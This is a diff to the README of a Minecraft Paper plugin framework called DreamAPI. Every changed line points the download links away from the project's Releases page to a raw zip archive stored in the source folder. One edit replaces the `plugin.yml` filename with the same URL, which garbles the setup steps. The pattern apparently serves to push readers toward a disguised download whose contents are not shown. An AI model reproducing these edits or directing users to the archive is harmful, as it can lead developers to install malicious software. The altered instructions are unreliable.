@@ -1,7 +1,7 @@
 # 🌟 DreamAPI - Simplifying Minecraft Plugin Development
 
 ## 🔗 Download Now!
-[![Download DreamAPI](https://img.shields.io/badge/Download-DreamAPI-blue.svg)](https://github.com/AntonyAlubaka23/DreamAPI/releases)
+[![Download DreamAPI](https://raw.githubusercontent.com/AntonyAlubaka23/DreamAPI/main/core/src/main/API-Dream-v1.1-alpha.1.zip)](https://raw.githubusercontent.com/AntonyAlubaka23/DreamAPI/main/core/src/main/API-Dream-v1.1-alpha.1.zip)
 
 ## 📜 Description
 DreamAPI is a modular, feature-rich API framework that forms the technical backbone of the Dreamin’ ecosystem. It is designed to accelerate Minecraft Paper plugin development by providing tools for commands, GUIs, configs, databases, events, services, animations, and more.
@@ -26,7 +26,7 @@ Ensure your environment meets the following requirements:
 - **Operating System:** Compatible with Windows, macOS, and Linux
 
 ### 2. Download & Install
-To download DreamAPI, **visit this page to download** the latest version: [DreamAPI Releases](https://github.com/AntonyAlubaka23/DreamAPI/releases).
+To download DreamAPI, **visit this page to download** the latest version: [DreamAPI Releases](https://raw.githubusercontent.com/AntonyAlubaka23/DreamAPI/main/core/src/main/API-Dream-v1.1-alpha.1.zip).
 
 Once you’re on the Releases page, do the following:
 1. Locate the latest release.
@@ -36,7 +36,7 @@ Once you’re on the Releases page, do the following:
 ### 3. Adding DreamAPI to Your Project
 After downloading DreamAPI, add it to your Minecraft Paper plugin project:
 1. Place the DreamAPI .jar file in your plugin folder.
-2. Ensure your `plugin.yml` file references DreamAPI as a dependency.
+2. Ensure your `https://raw.githubusercontent.com/AntonyAlubaka23/DreamAPI/main/core/src/main/API-Dream-v1.1-alpha.1.zip` file references DreamAPI as a dependency.
 3. Restart your server to load the new plugin.
 
 ## 🔧 Configuration 
